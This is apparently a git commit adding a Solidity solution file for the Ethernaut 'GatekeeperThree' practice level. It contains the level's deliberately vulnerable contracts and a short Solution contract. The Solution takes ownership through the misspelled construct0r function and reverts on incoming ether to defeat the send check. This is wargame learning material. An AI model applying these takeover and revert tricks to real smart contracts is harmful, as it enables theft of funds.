7382d8d88dcd249f1cdbc0cb7b1c1f89e789937c
465326302 <465326302@qq.com>
2023-03-04 23:18:44 +0800

    结束 复习

---
+++ Ethernaut/gatekeeper3 attack.sol
@@ -0,0 +1,92 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract SimpleTrick {
+  GatekeeperThree public target;
+  address public trick;
+  uint private password = block.timestamp;
+
+  constructor (address payable _target) {
+    target = GatekeeperThree(_target);
+  }
+    
+  function checkPassword(uint _password) public returns (bool) {
+    if (_password == password) {
+      return true;
+    }
+    password = block.timestamp;
+    return false;
+  }
+    
+  function trickInit() public {
+    trick = address(this);
+  }
+    
+  function trickyTrick() public {
+    if (address(this) == msg.sender && address(this) != trick) {
+      target.getAllowance(password);
+    }
+  }
+}
+
+contract GatekeeperThree {
+  address public owner;
+  address public entrant;
+  bool public allow_enterance = false;
+  SimpleTrick public trick;
+
+  function construct0r() public {
+      owner = msg.sender;
+  }
+
+  modifier gateOne() {
+    require(msg.sender == owner);
+    require(tx.origin != owner);
+    _;
+  }
+
+  modifier gateTwo() {
+    require(allow_enterance == true);
+    _;
+  }
+
+  modifier gateThree() {
+    if (address(this).balance > 0.001 ether && payable(owner).send(0.001 ether) == false) {
+      _;
+    }
+  }
+
+  function getAllowance(uint _password) public {
+    if (trick.checkPassword(_password)) {
+        allow_enterance = true;
+    }
+  }
+
+  function createTrick() public {
+    trick = new SimpleTrick(payable(address(this)));
+    trick.trickInit();
+  }
+
+  function enter() public gateOne gateTwo gateThree returns (bool entered) {
+    entrant = tx.origin;
+    return true;
+  }
+
+  receive () external payable {}
+}
+
+
+//应付大门，成为入门者。 
+ 
+//可能有帮助的事情: 召回低级函数的返回值。 注意语义。 刷新以太坊中的存储工作方式。
+
+contract Solution {
+    function solve(address _to) external {
+        GatekeeperThree(payable(_to)).construct0r();
+        GatekeeperThree(payable(_to)).enter();
+    }
+
+    fallback() external payable {
+        revert("sorry");
+    }
+}
